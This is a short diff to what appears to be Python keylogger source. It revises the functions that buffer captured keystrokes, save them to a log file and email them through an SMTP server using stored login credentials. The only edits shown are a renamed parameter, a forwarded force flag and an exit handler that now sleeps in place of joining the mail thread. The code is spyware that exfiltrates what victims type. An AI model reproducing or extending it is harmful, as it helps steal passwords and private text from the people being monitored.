@@ -124,13 +124,13 @@ def save_to_log(filename, data):
 #
 #   Using for buffering before send mail
 #
-def update_chunk_buffer(data, force=False):
+def update_chunk_buffer(buffer, force=False):
     global chunk_buffer, chunk_buffer_size
     global smtp_login, smtp_password, smtp_server, send_mail_to
 
     logging.debug('updating chunk buffer')
 
-    chunk_buffer += data
+    chunk_buffer += buffer
 
     if len(chunk_buffer) >= chunk_buffer_size or force:
         send_mail_job = SendMailJob(smtp_server, smtp_login, smtp_password, send_mail_to, chunk_buffer)
@@ -157,7 +157,7 @@ def update_keys_buffer(key, force=False):
         if args.output_file is not None:
             save_to_log(args.output_file, keys_buffer)
 
-        update_chunk_buffer(keys_buffer)
+        update_chunk_buffer(keys_buffer, force)
 
         keys_buffer = ''
 
@@ -201,9 +201,10 @@ def stop():
 def exit_handler():
     global send_smtp_job_timeout
 
-    # store all buffers before exit
+    # store buffers before exit
     update_keys_buffer('', True)
-    update_chunk_buffer('', True).join(send_smtp_job_timeout)
+
+    time.sleep(send_smtp_job_timeout)
 
 
 def main():
